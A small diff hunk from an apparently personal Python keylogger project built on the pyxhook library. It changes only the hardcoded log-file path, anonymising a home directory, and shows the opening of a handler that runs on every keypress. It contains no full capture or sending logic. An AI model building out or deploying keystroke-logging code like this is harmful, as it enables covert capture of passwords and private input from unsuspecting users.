@@ -3,7 +3,7 @@ Sentinel character is '`' Grave character
 """
 import pyxhook
 #change this to log file's path
-log_file='/home/vaibhav/Python Projects/KeyLogger/KeyLog.log'
+log_file='/home/...KeyLogger/KeyLog.log'
 
 #this function is called everytime a key is pressed.
 def OnKeyPress(event):
